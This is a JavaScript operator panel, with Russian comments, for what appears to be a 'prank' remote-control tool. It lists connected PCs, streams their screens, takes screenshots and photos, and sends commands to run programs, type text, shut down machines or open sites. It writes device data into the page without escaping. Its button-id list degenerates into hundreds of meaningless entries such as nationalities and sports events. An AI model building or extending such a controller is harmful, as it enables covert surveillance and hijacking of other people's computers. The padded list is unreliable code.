const socket = io();

// Элементы интерфейса
const deviceList = document.getElementById('device-list');
const deviceCount = document.getElementById('device-count');
const controlPanel = document.getElementById('control-panel');
const selectedDeviceInfo = document.getElementById('selected-device-info');
const deviceStatusBadge = document.getElementById('device-status');
const serverStatus = document.getElementById('server-status');
const photoPreview = document.getElementById('photo-preview');
const streamImage = document.getElementById('stream-image');
const streamPlaceholder = document.getElementById('stream-placeholder');
const streamQuality = document.getElementById('stream-quality');

// Поля ввода
const messageboxTitle = document.getElementById('messagebox-title');
const messageboxText = document.getElementById('messagebox-text');
const ttsText = document.getElementById('tts-text');
const wallpaperUrl = document.getElementById('wallpaper-url');
const programPath = document.getElementById('program-path');
const urlInput = document.getElementById('url-input');
const searchQuery = document.getElementById('search-query');
const typeText = document.getElementById('type-text');

// Состояние
const devices = new Map();
let selectedDeviceId = null;
let isStreaming = false;

// ========== Socket.IO события ==========
socket.on('connect', () => {
    serverStatus.textContent = 'Онлайн';
    serverStatus.style.color = '#4caf50';
    socket.emit('register-admin');
});

socket.on('disconnect', () => {
    serverStatus.textContent = 'Офлайн';
    serverStatus.style.color = '#f44336';
});

socket.on('device-connected', (data) => {
    devices.set(data.id, { info: data.info, online: data.online });
    updateDeviceList();
    if (data.id === selectedDeviceId) updateSelectedDeviceStatus();
});

socket.on('device-disconnected', (data) => {
    const device = devices.get(data.id);
    if (device) {
        device.online = false;
        updateDeviceList();
        if (data.id === selectedDeviceId) updateSelectedDeviceStatus();
    }
});

socket.on('photo', (data) => {
    if (data.deviceId === selectedDeviceId) {
        photoPreview.src = 'data:image/jpeg;base64,' + data.image;
        photoPreview.style.display = 'block';
    }
});

socket.on('stream-frame', (data) => {
    if (data.deviceId === selectedDeviceId && isStreaming) {
        streamImage.src = 'data:image/jpeg;base64,' + data.image;
        streamImage.style.display = 'block';
        streamPlaceholder.style.display = 'none';
    }
});

// ========== Функции интерфейса ==========
function updateDeviceList() {
    deviceList.innerHTML = '';
    let count = 0;
    devices.forEach((device, id) => {
        if (device.online) count++;
        const li = document.createElement('li');
        li.className = `device-item ${device.online ? 'online' : 'offline'}`;
        li.dataset.id = id;
        li.innerHTML = `
            <div class="device-icon"><i class="fas fa-desktop"></i></div>
            <div class="device-info">
                <div class="device-name">${device.info.model}</div>
                <div class="device-details">${device.info.version || ''}</div>
            </div>
            <div class="device-status ${device.online ? 'online' : 'offline'}"></div>
        `;
        li.addEventListener('click', () => selectDevice(id));
        deviceList.appendChild(li);
    });
    deviceCount.textContent = count;
}

function selectDevice(id) {
    selectedDeviceId = id;
    const device = devices.get(id);
    if (!device) return;
    selectedDeviceInfo.textContent = device.info.model;
    updateSelectedDeviceStatus();
    controlPanel.style.display = 'block';
    photoPreview.style.display = 'none';
    stopStreaming();
}

function updateSelectedDeviceStatus() {
    if (!selectedDeviceId) return;
    const device = devices.get(selectedDeviceId);
    if (device) {
        deviceStatusBadge.textContent = device.online ? 'Онлайн' : 'Офлайн';
        deviceStatusBadge.className = `status-badge ${device.online ? 'online' : 'offline'}`;
    }
}

function sendCommand(command, params = {}) {
    if (!selectedDeviceId) {
        console.log('Нет выбранного устройства');
        return;
    }
    socket.emit('command', { targetDeviceId: selectedDeviceId, command, params });
}

// ========== Трансляция ==========
function startStreaming() {
    if (!selectedDeviceId || isStreaming) return;
    isStreaming = true;
    const intervalMs = parseFloat(streamQuality.value) * 1000;
    sendCommand('start-stream', { interval: intervalMs });
    streamImage.style.display = 'none';
    streamPlaceholder.style.display = 'block';
    streamPlaceholder.textContent = 'Трансляция запущена, ожидание кадров...';
}

function stopStreaming() {
    if (!isStreaming) return;
    isStreaming = false;
    sendCommand('stop-stream');
    streamImage.style.display = 'none';
    streamPlaceholder.style.display = 'block';
    streamPlaceholder.textContent = 'Трансляция не активна';
}

// ========== Обработчики кнопок с параметрами ==========
document.getElementById('show-messagebox')?.addEventListener('click', () => {
    sendCommand('showMessage', { title: messageboxTitle.value || 'Prank', message: messageboxText.value || '' });
});
document.getElementById('speak-tts')?.addEventListener('click', () => {
    sendCommand('speak', { text: ttsText.value || 'Привет' });
});
document.getElementById('set-wallpaper')?.addEventListener('click', () => {
    sendCommand('setWallpaper', { url: wallpaperUrl.value });
});
document.getElementById('run-program')?.addEventListener('click', () => {
    sendCommand('runProgram', { path: programPath.value });
});
document.getElementById('open-url')?.addEventListener('click', () => {
    sendCommand('openUrl', { url: urlInput.value || 'https://example.com' });
});
document.getElementById('open-url-fullscreen')?.addEventListener('click', () => {
    sendCommand('openUrlFullscreen', { url: urlInput.value || 'https://example.com' });
});
document.getElementById('google-search')?.addEventListener('click', () => {
    sendCommand('googleSearch', { query: searchQuery.value || 'prank' });
});
document.getElementById('youtube-search')?.addEventListener('click', () => {
    sendCommand('youtubeSearch', { query: searchQuery.value || 'prank' });
});
document.getElementById('type-text-btn')?.addEventListener('click', () => {
    sendCommand('typeText', { text: typeText.value || 'Hello' });
});

// ========== Кнопки трансляции ==========
document.getElementById('start-stream')?.addEventListener('click', startStreaming);
document.getElementById('stop-stream')?.addEventListener('click', stopStreaming);
document.getElementById('start-stream-bottom')?.addEventListener('click', startStreaming);
document.getElementById('stop-stream-bottom')?.addEventListener('click', stopStreaming);

// ========== Автоматическое назначение для простых кнопок ==========
// Список всех ID простых кнопок (без параметров)
const simpleButtonIds = [
    'beep', 'setVolume50', 'setVolume0', 'setVolume100',
    'takeScreenshot', 'rotateScreen', 'blankScreen', 'invertColors',
    'setRandomWallpaper',
    'lockPc', 'shutdownPc', 'restartPc', 'sleepPc', 'hibernatePc', 'logoffPc',
    'openCdDrive', 'closeCdDrive', 'killTask', 'minimizeAll', 'maximizeAll',
    'openTaskManager', 'openRegedit', 'openCmd', 'openPowershell', 'openNotepad',
    'openCalc', 'openExplorer', 'openControlPanel', 'openSettings', 'openDeviceManager',
    'openDiskManagement', 'openSystemInfo', 'openTaskScheduler', 'openServices',
    'openEventViewer', 'openResourceMonitor', 'openPerformanceMonitor', 'openFirewall',
    'openDefender', 'openBluetooth', 'openNetworkConnections', 'openSoundSettings',
    'openPowerOptions', 'openDateTime', 'openMouseSettings', 'openKeyboardSettings',
    'openProgramsAndFeatures', 'openDefaultPrograms',
    'openYoutube', 'openNetflix', 'openTwitch', 'openReddit', 'openGithub', 'openStackoverflow',
    'openWikipedia', 'openRandomArticle', 'openXkcd', 'openOmfgdogs', 'openPointerpointer',
    'openStaggeringbeauty', 'openKoalastothemax', 'openTheuselessweb', 'openBoredbutton',
    'openTelegram', 'openWhatsapp', 'openVk', 'openZoomMeeting', 'openTeams', 'openDiscord',
    'openSlack', 'openOutlook', 'openGmail', 'openDrive', 'openDocs', 'openSheets',
    'openSlides', 'openForms', 'openKeep', 'openCalendar', 'openMaps', 'openTranslate',
    'openNews', 'openFlight', 'openHotel', 'openWeather', 'openCurrency',
    'openMinecraft', 'openRoblox', 'openFortnite', 'openAmongUs', 'openValorant',
    'openCsgo', 'openDota', 'openLol', 'openOverwatch', 'openApex', 'openPubg',
    'openCod', 'openFifa', 'openNba', 'openNfl', 'openNhl', 'openMlb', 'openUfc',
    'openWwe', 'openF1', 'openMotogp', 'openTennis', 'openGolf', 'openCycling', 'openSki',
    'openOlympics', 'openParalympics', 'openCommonwealth', 'openUniversiade',
    'openYouthOlympics', 'openSpecialOlympics', 'openInvictus', 'openWarrior',
    'openXgames', 'openDewTour', 'openStreetLeague', 'openWorldSkate', 'openIsa',
    'openIsl', 'openWsl', 'openWingfoil', 'openKite', 'openWindsurf', 'openSailing',
    'openRowing', 'openCanoe', 'openDragonBoat', 'openRafting', 'openKayak',
    'openSurfski', 'openOutrigger', 'openVaa', 'openWakaAma', 'openPolynesian',
    'openHawaiian', 'openMaori', 'openPasifika', 'openAboriginal', 'openIndigenous',
    'openFirstNations', 'openInuit', 'openSami', 'openSaami', 'openFinnish',
    'openSwedish', 'openNorwegian', 'openDanish', 'openIcelandic', 'openFaroese',
    'openGreenlandic', 'openAlaskan', 'openCanadian', 'openAmerican', 'openMexican',
    'openBrazilian', 'openArgentinian', 'openChilean', 'openPeruvian', 'openColombian',
    'openVenezuelan', 'openEcuadorian', 'openBolivian', 'openParaguayan', 'openUruguayan',
    'openDutch', 'openBelgian', 'openFrench', 'openSpanish', 'openPortuguese',
    'openItalian', 'openGreek', 'openTurkish', 'openRussian', 'openUkrainian',
    'openPolish', 'openCzech', 'openSlovak', 'openHungarian', 'openRomanian',
    'openBulgarian', 'openSerbian', 'openCroatian', 'openSlovenian', 'openBosnian',
    'openMacedonian', 'openAlbanian', 'openKosovar', 'openMontenegrin', 'openEstonian',
    'openLatvian', 'openLithuanian', 'openBelarusian', 'openMoldovan', 'openGeorgian',
    'openArmenian', 'openAzerbaijani', 'openKazakh', 'openUzbek', 'openTurkmen',
    'openKyrgyz', 'openTajik', 'openMongolian', 'openChinese', 'openJapanese',
    'openKorean', 'openNorthKorean', 'openTaiwanese', 'openHongKong', 'openMacanese',
    'openVietnamese', 'openLao', 'openCambodian', 'openThai', 'openMyanmar',
    'openMalaysian', 'openSingaporean', 'openIndonesian', 'openFilipino', 'openBruneian',
    'openTimorese', 'openAustralian', 'openNewZealand', 'openFijian', 'openPapuan',
    'openSolomon', 'openVanuatu', 'openSamoan', 'openTongan', 'openPalauan',
    'openMicronesian', 'openMarshallese', 'openNauruan', 'openKiribati', 'openTuvaluan'
];

// Назначаем обработчики
simpleButtonIds.forEach(id => {
    const btn = document.getElementById(id);
    if (btn) {
        btn.addEventListener('click', () => {
            // Если команда называется так же, как id, но бывают исключения (например, setVolume50 -> setVolume)
            // В нашем случае команды называются так же, как id, кроме тех, что с параметрами
            // Но для простоты считаем, что команда = id
            sendCommand(id);
        });
    } else {
        console.warn(`Кнопка с id "${id}" не найдена в HTML`);
    }
});

// Инициализация
updateDeviceList();